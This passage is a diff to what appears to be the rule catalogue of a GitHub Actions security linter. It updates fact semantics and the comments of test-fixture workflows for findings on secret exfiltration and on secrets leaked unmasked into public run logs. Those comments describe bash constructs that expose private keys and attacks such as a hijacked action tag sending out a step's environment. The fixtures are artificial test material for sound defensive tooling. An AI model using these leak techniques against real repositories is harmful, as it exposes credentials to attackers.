+    - request.destination-trusted (provider: user-supplied, answer that removes the finding: true)
   - example: trusted-destination.yml (workflow, false-positive)
     ```yaml
     # situation: on push, a step uploads a build to VirusTotal with curl and the
@@ -52298,7 +52323,7 @@
 - job-listener: a destination on the runner itself or in the job's network that only the job listens on, such as a server the job starts, on a runner that is not known to be GitHub's
   - finding kinds: secret-exfiltration.untrusted-destination
   - fact kinds:
-    - request.destination-trusted (provider: user-supplied, assumed value: false)
+    - request.destination-trusted (provider: user-supplied, answer that removes the finding: true)
   - example: job-listener.yml (workflow, false-positive)
     ```yaml
     # situation: on push, a job on a runner labelled linux.2xlarge starts a
@@ -52394,7 +52419,7 @@
   - reason: to hold the server of the destination, the attacker breaches the vendor or registers a lapsed domain
   - cites: none
 - AT: P
-  - reason: the finding holds when the destination is not to be trusted with the secret, which a file of facts says otherwise (request.destination-trusted, assumed false): the holder of the server is the attacker
+  - reason: the finding holds when the destination is not to be trusted with the secret (request.destination-trusted false; a file of facts or --fact can answer true): the holder of the server is the attacker
   - cites: none
 - PR: N
   - reason: nothing of the repository is needed
@@ -52452,7 +52477,7 @@
   - consequence: GitHub sends the job every secret of the repository, including the secrets that no expression of the job names, and also every secret of the environment of the job when the job references an environment. The memory of the runner holds every secret that GitHub sends the job, and code that runs in a step of the job can read every secret in the memory of the runner. The harm comes from two kinds of code: an action that turns malicious, and code that an attacker writes and that a flaw of the job runs. The harm is each secret that one of the two kinds of code can read now and could not read if each job of each workflow that can read the secret named only the secrets that the job needs. In the workflows that name only the needed secrets, GitHub sends each job only the secrets that the job names, and code that runs in a job can still read every secret that the job names. An action counts in every job, of any workflow, that runs the action; the code of an attacker counts only in the jobs whose flaw runs the code of the attacker
   - remedy: name each secret the job needs, secrets.NAME, and pick one by an if for each value of the matrix rather than by a secrets&#91;...] whose name is computed
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting)
   - attackers: maintainer-of-called, fork-pr-author, issue-author, commenter, anyone-who-forks
   - preconditions: nameless-reads-all, code-in-job
   - true positives:
@@ -52837,7 +52862,7 @@
 - pull-request-target-blocked: a workflow whose on has pull_request_target and no other event (no workflow_call event either), in a repository whose Actions policies block the runs of the workflow on pull_request_target (repo.pull-request-target-allowed false): an event policy that an administrator sets without pull_request_target among the allowed events, or the default policy that GitHub adds to a public repository without an applicable event policy, from the time when GitHub enforces the default policy on the repository. GitHub's documents say that GitHub evaluates the policies before a run, and that a run that a policy does not allow fails with an error. The documents do not say whether a job of such a run starts before the run fails; the rule assumes that no job of such a run starts
   - finding kinds: secret-exposure.all-secrets
   - fact kinds:
-    - repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+    - repo.pull-request-target-allowed (provider: repo-setting, answer that removes the finding: false)
   - example: pull-request-target-blocked.yml (workflow, false-positive)
     ```yaml
     # situation: on pull_request_target, a job passes toJSON(secrets) to the env
@@ -52851,9 +52876,10 @@
     #   run that a policy does not allow fails with an error; the documents do not
     #   say whether a job of such a run starts before the run fails, and the rule
     #   assumes that no job starts.
-    # cause: the rule assumes that a run on pull_request_target starts, unless a
-    #   file of facts or --fact says that the Actions policies block the runs
-    #   (repo.pull-request-target-allowed is assumed true, the worst case).
+    # cause: unless a file of facts or --fact says that the Actions policies block
+    #   runs on pull_request_target (repo.pull-request-target-allowed false), the
+    #   rule reports the finding. When no file of facts and no --fact answers
+    #   repo.pull-request-target-allowed, the finding is conditional.
     # attack: the maintainer of some/deploy-action, or one who took over the
     #   account of the maintainer, moves the tag v1 to code that sends out the env
     #   of the step.
@@ -53068,7 +53094,7 @@
   - consequence: the runner registers the secret, each line of the secret and encoded forms of the secret such as the base64 of the secret, and masks only those strings, not a value the shell makes from the secret: whoever has read access to the repository reads the value in the log; the log of the run is kept for 90 days by default
   - remedy: do not print the value; if the value must be printed, register each line of the value with ::add-mask:: before the value is printed; delete the logs of the runs that printed the value, and rotate the secret
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.public (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.public (provider: repo-setting)
   - attackers: log-reader
   - preconditions: derived-unmasked, printed-places, mask-after, readable-log
   - true positives:
@@ -53123,9 +53149,9 @@
   - true negatives:
     - private+public.append-earlier-value.yml (workflow, true-negative)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step sets fd to 1, appends 1 to fd, and prints the private key out of
-      #   the secret GCP_SA_KEY to the descriptor whose number fd holds.
+      # situation: on push, in a public repository (repo.public true), a step sets
+      #   fd to 1, appends 1 to fd, and prints the private key out of the secret
+      #   GCP_SA_KEY to the descriptor whose number fd holds.
       # reason: fd holds 11 at the print, and bash writes the print to descriptor
       #   11, which the step does not open, so the log has no part of the secret.
       # attack: anyone signed in to GitHub opens the run's log and reads the
@@ -53147,12 +53173,11 @@
       ```
     - private+public.call-descriptor.yml (workflow, true-negative)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step opens file descriptor 3 to /dev/null, defines a function f that
-      #   prints the secret DEPLOY_TOKEN without the first character of the secret
-      #   to the file descriptor whose number fd holds, and calls f twice: once
-      #   with fd=1 and the standard output of the call sent to /dev/null, and
-      #   once with fd=3.
+      # situation: on push, in a public repository (repo.public true), a step opens
+      #   file descriptor 3 to /dev/null, defines a function f that prints the
+      #   secret DEPLOY_TOKEN without the first character of the secret to the file
+      #   descriptor whose number fd holds, and calls f twice: once with fd=1 and
+      #   the standard output of the call sent to /dev/null, and once with fd=3.
       # reason: at each call the print goes to /dev/null, so the step prints no
       #   part of the secret.
       # attack: anyone who can read the run opens the log of the run and reads
@@ -53174,11 +53199,11 @@
       ```
     - private+public.closed-on-each-path.yml (workflow, true-negative)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step opens a descriptor on the standard error with exec {fd} when QUIET
-      #   is empty and on /dev/null otherwise, closes the descriptor whose number
-      #   fd holds with exec {fd}>&-, and prints the private key out of the
-      #   secret GCP_SA_KEY to the descriptor whose number fd holds.
+      # situation: on push, in a public repository (repo.public true), a step opens
+      #   a descriptor on the standard error with exec {fd} when QUIET is empty and
+      #   on /dev/null otherwise, closes the descriptor whose number fd holds with
+      #   exec {fd}>&-, and prints the private key out of the secret GCP_SA_KEY to
+      #   the descriptor whose number fd holds.
       # reason: exec {fd}>&- closes the descriptor that exec {fd} in the branch of
       #   if opened, so the print fails on both paths, and the log has no part of
       #   the secret.
@@ -53201,10 +53226,10 @@
       ```
     - private+public.exec-in-substitution.yml (workflow, true-negative)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step sets x to the output of a $( ) in which exec points the standard
-      #   output to /dev/null and then an echo prints the secret GCP_SA_KEY
-      #   without the first character of the secret, and prints x.
+      # situation: on push, in a public repository (repo.public true), a step sets x
+      #   to the output of a $( ) in which exec points the standard output to
+      #   /dev/null and then an echo prints the secret GCP_SA_KEY without the first
+      #   character of the secret, and prints x.
       # reason: the exec sends the print in the $( ) to /dev/null, so x is empty,
       #   and the log has no part of the secret.
       # attack: anyone signed in to GitHub opens the run's log and reads the
@@ -53224,11 +53249,11 @@
       ```
     - private+public.failing-redirect.yml (workflow, true-negative)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step sets X to safe, then assigns the secret DEPLOY_TOKEN without the
-      #   first character of the secret to X in a compound command whose redirect
-      #   copies file descriptor 9, which is not open, goes on when the compound
-      #   command fails (|| true), and prints X.
+      # situation: on push, in a public repository (repo.public true), a step sets X
+      #   to safe, then assigns the secret DEPLOY_TOKEN without the first character
+      #   of the secret to X in a compound command whose redirect copies file
+      #   descriptor 9, which is not open, goes on when the compound command fails
+      #   (|| true), and prints X.
       # reason: the copy of file descriptor 9 fails, so bash does not run the
       #   compound command, X keeps safe, and the step prints no part of the
       #   secret.
@@ -53250,10 +53275,10 @@
       ```
     - private+public.return-in-substitution.yml (workflow, true-negative)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step defines a function f that sets x to the output of a $( ) that runs
-      #   return and then prints the secret GCP_SA_KEY without its first
-      #   character, and prints x; the step calls f.
+      # situation: on push, in a public repository (repo.public true), a step
+      #   defines a function f that sets x to the output of a $( ) that runs return
+      #   and then prints the secret GCP_SA_KEY without its first character, and
+      #   prints x; the step calls f.
       # reason: return ends the commands of the $( ), so the print in the $( )
       #   does not run, x is empty, and the log has no part of the secret.
       # attack: anyone signed in to GitHub opens the run's log and reads the
@@ -53370,15 +53395,15 @@
   - consequence: the runner registers the secret, each line of the secret and encoded forms of the secret such as the base64 of the secret, and masks only those strings, not a value the shell makes from the secret: anyone signed in to GitHub reads the value in the log; the log of the run is kept for 90 days by default
   - remedy: do not print the value; if the value must be printed, register each line of the value with ::add-mask:: before the value is printed; delete the logs of the runs that printed the value, and rotate the secret
   - severity: critical (found from the CVSS metrics below by the table)
-  - fact kinds: repo.public (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.public (provider: repo-setting)
   - attackers: log-reader
   - preconditions: derived-unmasked, printed-places, mask-after, readable-log
   - true positives:
     - public.append-value.yml (workflow, true-positive)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step sets KEY to the private key out of the secret GCP_SA_KEY, appends
-      #   a suffix to KEY with KEY+=, and prints KEY.
+      # situation: on push, in a public repository (repo.public true), a step sets
+      #   KEY to the private key out of the secret GCP_SA_KEY, appends a suffix to
+      #   KEY with KEY+=, and prints KEY.
       # reason: KEY+= keeps the value of KEY before it and adds the suffix after
       #   it, so the print writes the private key to the log, and the runner does
       #   not mask the private key.
@@ -53400,8 +53425,8 @@
       ```
     - public.custom-shell-xtrace.yml (workflow, true-positive)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step whose shell: is bash -x {0} assigns a substring of the secret TOKEN.
+      # situation: on push, in a public repository (repo.public true), a step whose
+      #   shell: is bash -x {0} assigns a substring of the secret TOKEN.
       # reason: bash -x starts the script with the trace on, as set -x does, so
       #   the trace prints the assignment with the substring, which the runner
       #   does not mask.
@@ -53422,9 +53447,9 @@
       ```
     - public.default-assignment.yml (workflow, true-positive)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step sets a variable to the private key out of the secret GCP_SA_KEY
-      #   with the operator := of a parameter expansion, and prints the variable.
+      # situation: on push, in a public repository (repo.public true), a step sets a
+      #   variable to the private key out of the secret GCP_SA_KEY with the operator
+      #   := of a parameter expansion, and prints the variable.
       # reason: bash assigns the private key to the
       #   variable, which is unset, and the runner does not mask the private key.
       # attack: anyone signed in to GitHub opens the run's log and reads the
@@ -53444,9 +53469,9 @@
       ```
     - public.descriptor-not-literal.yml (workflow, true-positive)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step sets PRIVATE_KEY to the private key out of the secret GCP_SA_KEY,
-      #   sets fd to the output of echo 2, and prints PRIVATE_KEY with >&$fd.
+      # situation: on push, in a public repository (repo.public true), a step sets
+      #   PRIVATE_KEY to the private key out of the secret GCP_SA_KEY, sets fd to
+      #   the output of echo 2, and prints PRIVATE_KEY with >&$fd.
       # reason: bash duplicates the descriptor 2, the standard error, so the
       #   private key goes to the log, and the runner does not mask the private
       #   key.
@@ -53469,10 +53494,10 @@
       ```
     - public.descriptor-per-path.yml (workflow, true-positive)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step points the standard error to /dev/null when QUIET is set, takes the
-      #   private key out of the secret GCP_SA_KEY with jq, and prints the key to
-      #   the standard error.
+      # situation: on push, in a public repository (repo.public true), a step points
+      #   the standard error to /dev/null when QUIET is set, takes the private key
+      #   out of the secret GCP_SA_KEY with jq, and prints the key to the standard
+      #   error.
       # reason: QUIET is not set in the step, so bash does not run the exec,
       #   the standard error is the log, and the runner does not mask the
       #   private key.
@@ -53493,10 +53518,10 @@
       ```
     - public.element-before-command.yml (workflow, true-positive)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step sets PRIVATE_KEY to the private key out of the secret GCP_SA_KEY, and
-      #   prints PRIVATE_KEY with echo after an assignment of an element of an array
-      #   before the command word (a[0]=x echo ...).
+      # situation: on push, in a public repository (repo.public true), a step sets
+      #   PRIVATE_KEY to the private key out of the secret GCP_SA_KEY, and prints
+      #   PRIVATE_KEY with echo after an assignment of an element of an array before
+      #   the command word (a[0]=x echo ...).
       # reason: bash refuses the assignment of the element before the command word
       #   and runs echo, and the runner does not mask the private key.
       # attack: anyone signed in to GitHub opens the run's log and reads the private
@@ -53516,10 +53541,10 @@
       ```
     - public.element-before-set-x.yml (workflow, true-positive)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step runs set -x after an assignment of an element of an array before the
-      #   command word (a[0]=x set -x), and then sets PRIVATE_KEY to the private key
-      #   out of the secret GCP_SA_KEY.
+      # situation: on push, in a public repository (repo.public true), a step runs
+      #   set -x after an assignment of an element of an array before the command
+      #   word (a[0]=x set -x), and then sets PRIVATE_KEY to the private key out of
+      #   the secret GCP_SA_KEY.
       # reason: bash refuses the assignment of the element and runs set -x, so the
       #   trace prints the assignment of the private key, which the runner does not
       #   mask.
@@ -53541,10 +53566,10 @@
       ```
     - public.exec-after-and.yml (workflow, true-positive)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step points the standard output to /dev/null with exec, points it back
-      #   to the standard error with exec after && when VERBOSE is empty, and
-      #   prints the private key out of the secret GCP_SA_KEY.
+      # situation: on push, in a public repository (repo.public true), a step points
+      #   the standard output to /dev/null with exec, points it back to the standard
+      #   error with exec after && when VERBOSE is empty, and prints the private key
+      #   out of the secret GCP_SA_KEY.
       # reason: VERBOSE is not set in the step, so the second exec runs, the print
       #   goes to the standard error, which is the log, and the runner does not
       #   mask the private key.
@@ -53567,10 +53592,10 @@
       ```
     - public.exec-on-some-path.yml (workflow, true-positive)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step points the standard output to /dev/null with exec, points it back
-      #   to the standard error with exec when VERBOSE is empty, and prints the
-      #   private key out of the secret GCP_SA_KEY.
+      # situation: on push, in a public repository (repo.public true), a step points
+      #   the standard output to /dev/null with exec, points it back to the standard
+      #   error with exec when VERBOSE is empty, and prints the private key out of
+      #   the secret GCP_SA_KEY.
       # reason: VERBOSE is not set in the step, so the second exec runs, the print
       #   goes to the standard error, which is the log, and the runner does not
       #   mask the private key.
@@ -53593,11 +53618,10 @@
       ```
     - public.failed-builtin-redirect.yml (workflow, true-positive)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step sets fd to 2, runs declare fd=4 with a redirect >&4, where the
-      #   descriptor 4 is not open, goes on when it fails (|| true), and prints the
-      #   private key out of the secret GCP_SA_KEY to the descriptor whose number
-      #   fd holds.
+      # situation: on push, in a public repository (repo.public true), a step sets
+      #   fd to 2, runs declare fd=4 with a redirect >&4, where the descriptor 4 is
+      #   not open, goes on when it fails (|| true), and prints the private key out
+      #   of the secret GCP_SA_KEY to the descriptor whose number fd holds.
       # reason: the redirect of declare fails, so bash does not run declare, fd
       #   holds 2, the print goes to the standard error, which is the log, and the
       #   runner does not mask the private key.
@@ -53620,10 +53644,10 @@
       ```
     - public.failed-duplicate.yml (workflow, true-positive)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step runs exec >&4, where descriptor 4 is not open, goes on when the
-      #   exec fails (|| true), and prints the private key out of the secret
-      #   GCP_SA_KEY to the standard output.
+      # situation: on push, in a public repository (repo.public true), a step runs
+      #   exec >&4, where descriptor 4 is not open, goes on when the exec fails (||
+      #   true), and prints the private key out of the secret GCP_SA_KEY to the
+      #   standard output.
       # reason: the exec fails, bash does not copy the
       #   descriptor 4 to the standard output, and the standard output still goes
       #   to the log; the runner does not mask the private key.
@@ -53644,10 +53668,10 @@
       ```
     - public.failed-exec-redirect.yml (workflow, true-positive)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step runs exec 2>/dev/null 3>&4, where the descriptor 4 is not open, goes
-      #   on when the exec fails (|| true), and prints the private key out of the
-      #   secret GCP_SA_KEY to the standard error.
+      # situation: on push, in a public repository (repo.public true), a step runs
+      #   exec 2>/dev/null 3>&4, where the descriptor 4 is not open, goes on when
+      #   the exec fails (|| true), and prints the private key out of the secret
+      #   GCP_SA_KEY to the standard error.
       # reason: the redirect 3>&4 fails, so bash undoes the other redirect of the
       #   exec too, the standard error is still the log, and the runner does not
       #   mask the private key.
@@ -53669,8 +53693,8 @@
       ```
     - public.function-output.yml (workflow, true-positive)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step defines a function f that prints the private key out of the secret
+      # situation: on push, in a public repository (repo.public true), a step
+      #   defines a function f that prints the private key out of the secret
       #   GCP_SA_KEY to the standard error, and calls f with |& before cat.
       # reason: |& sends the standard error of f to cat, cat prints the private
       #   key to the log, and the runner does not mask the private key.
@@ -53691,9 +53715,9 @@
       ```
     - public.function-stderr.yml (workflow, true-positive)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   function prints its argument to the standard error, and a step calls the
-      #   function in a $( ) with four characters of the secret DEPLOY_TOKEN.
+      # situation: on push, in a public repository (repo.public true), a function
+      #   prints its argument to the standard error, and a step calls the function
+      #   in a $( ) with four characters of the secret DEPLOY_TOKEN.
       # reason: the $( ) takes the standard output of the function alone; the
       #   standard error of the function goes to the log, and the runner does not
       #   mask the four characters.
@@ -53715,10 +53739,10 @@
       ```
     - public.function-traced.yml (workflow, true-positive)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step defines a function that takes the private key out of the secret
-      #   GCP_SA_KEY with jq into a variable, turns the trace on with set -x, and
-      #   calls the function.
+      # situation: on push, in a public repository (repo.public true), a step
+      #   defines a function that takes the private key out of the secret GCP_SA_KEY
+      #   with jq into a variable, turns the trace on with set -x, and calls the
+      #   function.
       # reason: bash traces the commands of the function where the call runs
       #   with the trace on, so the trace prints the assignment with the private
       #   key, which the runner does not mask.
@@ -53741,11 +53765,11 @@
       ```
     - public.jump-path.yml (workflow, true-positive)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step sets fd to 4; in a for loop, the step sets fd to 2, leaves the loop
-      #   with break when STOP is empty, and sets fd to 4 after the break; after
-      #   the loop, the step prints the private key out of the secret GCP_SA_KEY
-      #   to the descriptor whose number fd holds.
+      # situation: on push, in a public repository (repo.public true), a step sets
+      #   fd to 4; in a for loop, the step sets fd to 2, leaves the loop with break
+      #   when STOP is empty, and sets fd to 4 after the break; after the loop, the
+      #   step prints the private key out of the secret GCP_SA_KEY to the descriptor
+      #   whose number fd holds.
       # reason: STOP is not set in the step, so the loop
       #   ends at the break with fd holding 2, the private key goes to the
       #   standard error, which is the log, and the runner does not mask the
@@ -53769,10 +53793,9 @@
       ```
     - public.no-caller.action.yml (action-metadata, true-positive)
       ```yaml
-      # situation: a composite action with no caller among the files that the
-      #   linter reads, in a public repository (repo.public, assumed true); a step
-      #   takes the token of the job without the prefix ghs_ with sed and prints the
-      #   rest.
+      # situation: a composite action with no caller among the files that the linter
+      #   reads, in a public repository (repo.public true); a step takes the token
+      #   of the job without the prefix ghs_ with sed and prints the rest.
       # reason: the runner masks the whole token where the whole token is in the
       #   log, not the rest that sed leaves after sed removes ghs_, so the rest is
       #   in the log unmasked, and the prefix ghs_ is the same for every token.
@@ -53794,10 +53817,10 @@
       ```
     - public.skipped-assignment.yml (workflow, true-positive)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step sets fd to 2, defines a function f that sets fd to 4 only when Q is
-      #   set, calls f, and prints the private key out of the secret GCP_SA_KEY to
-      #   the descriptor whose number fd holds.
+      # situation: on push, in a public repository (repo.public true), a step sets
+      #   fd to 2, defines a function f that sets fd to 4 only when Q is set, calls
+      #   f, and prints the private key out of the secret GCP_SA_KEY to the
+      #   descriptor whose number fd holds.
       # reason: Q is not set in the step, so f is not
       #   defined, the call fails, fd holds 2, the private key goes to the
       #   standard error, which is the log, and the runner does not mask the
@@ -53822,12 +53845,11 @@
       ```
     - public.skipped-exec.yml (workflow, true-positive)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step runs a compound command that points the standard error to /dev/null
-      #   with exec, with a redirect >&4 of the compound command, where the
-      #   descriptor 4 is not open, goes on when the redirect fails (|| true), and
-      #   prints the private key out of the secret GCP_SA_KEY to the standard
-      #   error.
+      # situation: on push, in a public repository (repo.public true), a step runs a
+      #   compound command that points the standard error to /dev/null with exec,
+      #   with a redirect >&4 of the compound command, where the descriptor 4 is not
+      #   open, goes on when the redirect fails (|| true), and prints the private
+      #   key out of the secret GCP_SA_KEY to the standard error.
       # reason: the redirect of the compound command
       #   fails, so bash does not run the exec, the standard error is the log, and
       #   the runner does not mask the private key.
@@ -53849,9 +53871,9 @@
       ```
     - public.yml (workflow, true-positive)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step gets the JSON key of a service account from the secret GCP_SA_KEY,
-      #   takes the private key out with jq and prints the private key.
+      # situation: on push, in a public repository (repo.public true), a step gets
+      #   the JSON key of a service account from the secret GCP_SA_KEY, takes the
+      #   private key out with jq and prints the private key.
       # reason: the runner masks GCP_SA_KEY where the whole JSON is in the log,
       #   not the private key jq takes out of the JSON, so the private key is in
       #   the log as it is.
@@ -53874,9 +53896,9 @@
   - true negatives:
     - private+public.append-earlier-value.yml (workflow, true-negative)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step sets fd to 1, appends 1 to fd, and prints the private key out of
-      #   the secret GCP_SA_KEY to the descriptor whose number fd holds.
+      # situation: on push, in a public repository (repo.public true), a step sets
+      #   fd to 1, appends 1 to fd, and prints the private key out of the secret
+      #   GCP_SA_KEY to the descriptor whose number fd holds.
       # reason: fd holds 11 at the print, and bash writes the print to descriptor
       #   11, which the step does not open, so the log has no part of the secret.
       # attack: anyone signed in to GitHub opens the run's log and reads the
@@ -53898,12 +53920,11 @@
       ```
     - private+public.call-descriptor.yml (workflow, true-negative)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step opens file descriptor 3 to /dev/null, defines a function f that
-      #   prints the secret DEPLOY_TOKEN without the first character of the secret
-      #   to the file descriptor whose number fd holds, and calls f twice: once
-      #   with fd=1 and the standard output of the call sent to /dev/null, and
-      #   once with fd=3.
+      # situation: on push, in a public repository (repo.public true), a step opens
+      #   file descriptor 3 to /dev/null, defines a function f that prints the
+      #   secret DEPLOY_TOKEN without the first character of the secret to the file
+      #   descriptor whose number fd holds, and calls f twice: once with fd=1 and
+      #   the standard output of the call sent to /dev/null, and once with fd=3.
       # reason: at each call the print goes to /dev/null, so the step prints no
       #   part of the secret.
       # attack: anyone who can read the run opens the log of the run and reads
@@ -53925,11 +53946,11 @@
       ```
     - private+public.closed-on-each-path.yml (workflow, true-negative)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step opens a descriptor on the standard error with exec {fd} when QUIET
-      #   is empty and on /dev/null otherwise, closes the descriptor whose number
-      #   fd holds with exec {fd}>&-, and prints the private key out of the
-      #   secret GCP_SA_KEY to the descriptor whose number fd holds.
+      # situation: on push, in a public repository (repo.public true), a step opens
+      #   a descriptor on the standard error with exec {fd} when QUIET is empty and
+      #   on /dev/null otherwise, closes the descriptor whose number fd holds with
+      #   exec {fd}>&-, and prints the private key out of the secret GCP_SA_KEY to
+      #   the descriptor whose number fd holds.
       # reason: exec {fd}>&- closes the descriptor that exec {fd} in the branch of
       #   if opened, so the print fails on both paths, and the log has no part of
       #   the secret.
@@ -53952,10 +53973,10 @@
       ```
     - private+public.exec-in-substitution.yml (workflow, true-negative)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step sets x to the output of a $( ) in which exec points the standard
-      #   output to /dev/null and then an echo prints the secret GCP_SA_KEY
-      #   without the first character of the secret, and prints x.
+      # situation: on push, in a public repository (repo.public true), a step sets x
+      #   to the output of a $( ) in which exec points the standard output to
+      #   /dev/null and then an echo prints the secret GCP_SA_KEY without the first
+      #   character of the secret, and prints x.
       # reason: the exec sends the print in the $( ) to /dev/null, so x is empty,
       #   and the log has no part of the secret.
       # attack: anyone signed in to GitHub opens the run's log and reads the
@@ -53975,11 +53996,11 @@
       ```
     - private+public.failing-redirect.yml (workflow, true-negative)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step sets X to safe, then assigns the secret DEPLOY_TOKEN without the
-      #   first character of the secret to X in a compound command whose redirect
-      #   copies file descriptor 9, which is not open, goes on when the compound
-      #   command fails (|| true), and prints X.
+      # situation: on push, in a public repository (repo.public true), a step sets X
+      #   to safe, then assigns the secret DEPLOY_TOKEN without the first character
+      #   of the secret to X in a compound command whose redirect copies file
+      #   descriptor 9, which is not open, goes on when the compound command fails
+      #   (|| true), and prints X.
       # reason: the copy of file descriptor 9 fails, so bash does not run the
       #   compound command, X keeps safe, and the step prints no part of the
       #   secret.
@@ -54001,10 +54022,10 @@
       ```
     - private+public.return-in-substitution.yml (workflow, true-negative)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step defines a function f that sets x to the output of a $( ) that runs
-      #   return and then prints the secret GCP_SA_KEY without its first
-      #   character, and prints x; the step calls f.
+      # situation: on push, in a public repository (repo.public true), a step
+      #   defines a function f that sets x to the output of a $( ) that runs return
+      #   and then prints the secret GCP_SA_KEY without its first character, and
+      #   prints x; the step calls f.
       # reason: return ends the commands of the $( ), so the print in the $( )
       #   does not run, x is empty, and the log has no part of the secret.
       # attack: anyone signed in to GitHub opens the run's log and reads the
@@ -54130,9 +54151,9 @@
       ```
     - public.transform-quoted.yml (workflow, true-negative)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step prints the secret API_KEY written as a declare command that sets
-      #   the variable again (${API_KEY@A}).
+      # situation: on push, in a public repository (repo.public true), a step prints
+      #   the secret API_KEY written as a declare command that sets the variable
+      #   again (${API_KEY@A}).
       # reason: ${API_KEY@A} writes the whole key inside quotes, as ${API_KEY@Q}
       #   does, and the runner masks the key where the whole key is in the log.
       # attack: anyone signed in to GitHub opens the run's log to read the key.
@@ -54150,9 +54171,8 @@
       ```
     - public.yml (workflow, true-negative)
       ```yaml
-      # situation: on push, in a public repository (repo.public, assumed true), a
-      #   step prints the secret API_KEY whole, and a value it got from a request
-      #   with the key.
+      # situation: on push, in a public repository (repo.public true), a step prints
+      #   the secret API_KEY whole, and a value it got from a request with the key.
       # reason: the runner masks API_KEY where the whole key is in the log, and
       #   the response of the request is not made from the key.
       # attack: anyone signed in to GitHub opens the run's log to read the key.
@@ -54179,10 +54199,10 @@
   - disposition: todo (needs: same-file)
   - example: lastpipe-not-literal.yml (workflow, undetected)
     ```yaml
-    # situation: on push, in a public repository (repo.public, assumed true), a
-    #   step turns lastpipe on with shopt -s and the option name in a variable,
-    #   takes the private key out of the secret GCP_SA_KEY with jq into a
-    #   variable in the last command of a pipeline, and prints the variable.
+    # situation: on push, in a public repository (repo.public true), a step turns
+    #   lastpipe on with shopt -s and the option name in a variable, takes the
+    #   private key out of the secret GCP_SA_KEY with jq into a variable in the
+    #   last command of a pipeline, and prints the variable.
     # reason: a todo (the same file): with lastpipe, bash runs the last command
     #   of the pipeline in the shell that runs the pipeline, so the variable
     #   holds the private key when echo runs, and the runner does not mask it.
@@ -54210,9 +54230,9 @@
   - disposition: todo (needs: same-file)
   - example: name-not-literal.yml (workflow, undetected)
     ```yaml
-    # situation: on push, in a public repository (repo.public, assumed true), a
-    #   step sets n to the name PRIVATE_KEY, assigns the private key out of the
-    #   secret GCP_SA_KEY to the variable that n names with declare, and prints
+    # situation: on push, in a public repository (repo.public true), a step sets n
+    #   to the name PRIVATE_KEY, assigns the private key out of the secret
+    #   GCP_SA_KEY to the variable that n names with declare, and prints
     #   PRIVATE_KEY.
     # reason: a todo (the same file): bash assigns the private key to
     #   PRIVATE_KEY, and the runner does not mask the private key.
@@ -54239,11 +54259,11 @@
   - disposition: todo (needs: same-file)
   - example: recursive-unset-local.yml (workflow, undetected)
     ```yaml
-    # situation: on push, in a public repository (repo.public, assumed true), a
-    #   step defines f, which calls h on the first call of f and calls g on the
-    #   second call of f; h sets s to the secret DEPLOY_TOKEN without the first
-    #   character of the secret, makes s local with safe, and calls f. g unsets s
-    #   and prints "token: " and $s.
+    # situation: on push, in a public repository (repo.public true), a step
+    #   defines f, which calls h on the first call of f and calls g on the second
+    #   call of f; h sets s to the secret DEPLOY_TOKEN without the first character
+    #   of the secret, makes s local with safe, and calls f. g unsets s and prints
+    #   "token: " and $s.
     # reason: a todo (the same file): in the second call of f, the unset in g
     #   takes away the local that h made, and s holds the value that h set before
     #   h made s local: the token without the first character, which the runner
@@ -54274,11 +54294,11 @@
   - disposition: todo (needs: same-file)
   - example: unset-caller-local.yml (workflow, undetected)
     ```yaml
-    # situation: on push, in a public repository (repo.public, assumed true), a
-    #   step sets s to x and defines reset, which unsets s; point makes s local
-    #   with safe, calls reset, and sets s to the secret DEPLOY_TOKEN without the
-    #   first character of the secret. The step calls point and then prints
-    #   "token: " and $s.
+    # situation: on push, in a public repository (repo.public true), a step sets s
+    #   to x and defines reset, which unsets s; point makes s local with safe,
+    #   calls reset, and sets s to the secret DEPLOY_TOKEN without the first
+    #   character of the secret. The step calls point and then prints "token: "
+    #   and $s.
     # reason: a todo (the same file): the unset in reset takes away the local that
     #   point made, so the assignment in point after reset sets the s of the step:
